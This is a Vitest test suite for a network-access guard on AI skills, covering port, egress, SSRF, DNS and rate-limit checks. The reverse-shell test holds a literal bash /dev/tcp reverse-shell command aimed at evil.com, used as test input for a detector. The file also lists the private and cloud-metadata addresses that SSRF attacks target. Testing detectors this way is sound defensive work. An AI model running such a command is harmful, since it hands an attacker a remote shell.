import { describe, it, expect, beforeEach } from 'vitest';
import { NetworkAccessHandler, validatePortBind, validateEgress, validateDNS } from '../../dist/handlers/network-access';
import { TorkConfigSchema } from '../../dist/config';

function makeConfig(overrides: Record<string, unknown> = {}) {
  return TorkConfigSchema.parse({ apiKey: 'test-key', ...overrides });
}

describe('NetworkAccessHandler', () => {
  let handler: NetworkAccessHandler;
  let defaultConfig: ReturnType<typeof makeConfig>;

  beforeEach(() => {
    defaultConfig = makeConfig();
    handler = new NetworkAccessHandler(defaultConfig);
  });

  describe('validatePortBind', () => {
    it('blocks privileged ports (< 1024)', () => {
      const result = handler.validatePortBind('skill-a', 80);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Privileged port');
    });

    it('blocks port 22 (SSH)', () => {
      expect(handler.validatePortBind('s', 22).allowed).toBe(false);
    });

    it('blocks port 443 inbound', () => {
      expect(handler.validatePortBind('s', 443).allowed).toBe(false);
    });

    it('allows ports in the default inbound allowlist (3000-3999)', () => {
      expect(handler.validatePortBind('s', 3000).allowed).toBe(true);
      expect(handler.validatePortBind('s', 3500).allowed).toBe(true);
      expect(handler.validatePortBind('s', 3999).allowed).toBe(true);
    });

    it('allows ports in the default inbound allowlist (8000-8999)', () => {
      expect(handler.validatePortBind('s', 8000).allowed).toBe(true);
      expect(handler.validatePortBind('s', 8080).allowed).toBe(true);
      expect(handler.validatePortBind('s', 8999).allowed).toBe(true);
    });

    it('denies ports outside the allowlist', () => {
      expect(handler.validatePortBind('s', 5555).allowed).toBe(false);
      expect(handler.validatePortBind('s', 9999).allowed).toBe(false);
    });

    it('registers port binding after allowed bind', () => {
      handler.validatePortBind('skill-a', 3000);
      const owner = handler.getMonitor().getPortOwner(3000);
      expect(owner).toBeDefined();
      expect(owner!.skillId).toBe('skill-a');
    });
  });

  describe('port hijacking detection', () => {
    it('detects port hijacking by another skill', () => {
      handler.validatePortBind('skill-a', 3000);
      const result = handler.validatePortBind('skill-b', 3000);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Port hijacking');
    });

    it('allows same skill to rebind its own port', () => {
      handler.validatePortBind('skill-a', 3000);
      expect(handler.validatePortBind('skill-a', 3000).allowed).toBe(true);
    });
  });

  describe('validateEgress', () => {
    it('allows outbound on port 443 (default policy)', () => {
      const result = handler.validateEgress('s', 'api.openai.com', 443);
      expect(result.allowed).toBe(true);
    });

    it('allows outbound on port 80 (default policy)', () => {
      expect(handler.validateEgress('s', 'example.com', 80).allowed).toBe(true);
    });

    it('allows outbound on port 8080 (default policy)', () => {
      expect(handler.validateEgress('s', 'example.com', 8080).allowed).toBe(true);
    });

    it('denies outbound on non-permitted ports', () => {
      const result = handler.validateEgress('s', 'example.com', 22);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('not allowed');
    });

    it('records connection after allowed egress', () => {
      handler.validateEgress('s', 'example.com', 443);
      expect(handler.getMonitor().getConnectionsPerMinute('s')).toBe(1);
    });
  });

  describe('private network blocking (SSRF)', () => {
    const privateHosts = [
      '127.0.0.1',
      '10.0.0.1',
      '10.255.255.255',
      '172.16.0.1',
      '172.31.255.255',
      '192.168.1.1',
      '192.168.0.1',
      '169.254.169.254',
      '0.0.0.0',
      'localhost',
    ];

    for (const host of privateHosts) {
      it(`blocks egress to ${host}`, () => {
        expect(handler.validateEgress('s', host, 443).allowed).toBe(false);
      });
    }

    it('allows egress to public hosts', () => {
      expect(handler.validateEgress('s', 'api.openai.com', 443).allowed).toBe(true);
    });
  });

  describe('domain allowlist (strict policy)', () => {
    let strictHandler: NetworkAccessHandler;

    beforeEach(() => {
      strictHandler = new NetworkAccessHandler(makeConfig({ networkPolicy: 'strict' }));
    });

    it('allows whitelisted domains', () => {
      expect(strictHandler.validateEgress('s', 'api.openai.com', 443).allowed).toBe(true);
      expect(strictHandler.validateEgress('s', 'api.anthropic.com', 443).allowed).toBe(true);
      expect(strictHandler.validateEgress('s', 'tork.network', 443).allowed).toBe(true);
      expect(strictHandler.validateEgress('s', 'github.com', 443).allowed).toBe(true);
    });

    it('blocks non-whitelisted domains', () => {
      expect(strictHandler.validateEgress('s', 'evil.com', 443).allowed).toBe(false);
      expect(strictHandler.validateEgress('s', 'pastebin.com', 443).allowed).toBe(false);
    });

    it('blocks subdomains of non-whitelisted domains', () => {
      expect(strictHandler.validateEgress('s', 'sub.evil.com', 443).allowed).toBe(false);
    });
  });

  describe('domain blocklist', () => {
    it('blocks exact match in blocklist', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        blockedDomains: ['evil.com'],
      }));
      expect(h.validateEgress('s', 'evil.com', 443).allowed).toBe(false);
    });

    it('blocks subdomains of blocked domains', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        blockedDomains: ['evil.com'],
      }));
      expect(h.validateEgress('s', 'sub.evil.com', 443).allowed).toBe(false);
    });
  });

  describe('rate limiting', () => {
    it('denies when rate limit is exceeded', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        maxConnectionsPerMinute: 3,
      }));
      expect(h.validateEgress('s', 'a.com', 443).allowed).toBe(true);
      expect(h.validateEgress('s', 'b.com', 443).allowed).toBe(true);
      expect(h.validateEgress('s', 'c.com', 443).allowed).toBe(true);
      const result = h.validateEgress('s', 'd.com', 443);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Rate limit');
    });
  });

  describe('reverse shell detection', () => {
    it('denies egress after suspicious shell command', () => {
      handler.getMonitor().recordShellCommand('bash -i >& /dev/tcp/evil.com/4444 0>&1', 'skill-a');
      const result = handler.validateEgress('skill-a', 'evil.com', 443);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Reverse shell');
    });

    it('allows egress when shell commands are benign', () => {
      handler.getMonitor().recordShellCommand('echo hello', 'skill-a');
      expect(handler.validateEgress('skill-a', 'example.com', 443).allowed).toBe(true);
    });
  });

  describe('validateDNS', () => {
    it('allows valid hostnames', () => {
      expect(handler.validateDNS('s', 'api.openai.com').allowed).toBe(true);
    });

    it('blocks raw IPv4 addresses', () => {
      const result = handler.validateDNS('s', '192.168.1.1');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Raw IP');
    });

    it('blocks raw IPv6 addresses', () => {
      expect(handler.validateDNS('s', '::1').allowed).toBe(false);
    });

    it('enforces blocklist for DNS', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        blockedDomains: ['evil.com'],
      }));
      expect(h.validateDNS('s', 'evil.com').allowed).toBe(false);
    });

    it('enforces allowlist for DNS under strict policy', () => {
      const h = new NetworkAccessHandler(makeConfig({ networkPolicy: 'strict' }));
      expect(h.validateDNS('s', 'api.openai.com').allowed).toBe(true);
      expect(h.validateDNS('s', 'unknown.com').allowed).toBe(false);
    });
  });

  describe('activity log', () => {
    it('logs allowed actions', () => {
      handler.validatePortBind('skill-a', 3000);
      const log = handler.getActivityLog();
      expect(log.length).toBe(1);
      expect(log[0].allowed).toBe(true);
      expect(log[0].skillId).toBe('skill-a');
      expect(log[0].action).toBe('port_bind');
    });

    it('always logs denied actions', () => {
      handler.validatePortBind('s', 22);
      expect(handler.getActivityLog().length).toBe(1);
      expect(handler.getActivityLog()[0].allowed).toBe(false);
    });

    it('clears log', () => {
      handler.validatePortBind('s', 3000);
      handler.clearActivityLog();
      expect(handler.getActivityLog().length).toBe(0);
    });
  });

  describe('standalone functions', () => {
    it('validatePortBind works standalone', () => {
      expect(validatePortBind(defaultConfig, 's', 3000).allowed).toBe(true);
      expect(validatePortBind(defaultConfig, 's', 22).allowed).toBe(false);
    });

    it('validateEgress works standalone', () => {
      expect(validateEgress(defaultConfig, 's', 'example.com', 443).allowed).toBe(true);
      expect(validateEgress(defaultConfig, 's', 'example.com', 22).allowed).toBe(false);
    });

    it('validateDNS works standalone', () => {
      expect(validateDNS(defaultConfig, 's', 'example.com').allowed).toBe(true);
      expect(validateDNS(defaultConfig, 's', '10.0.0.1').allowed).toBe(false);
    });
  });
});
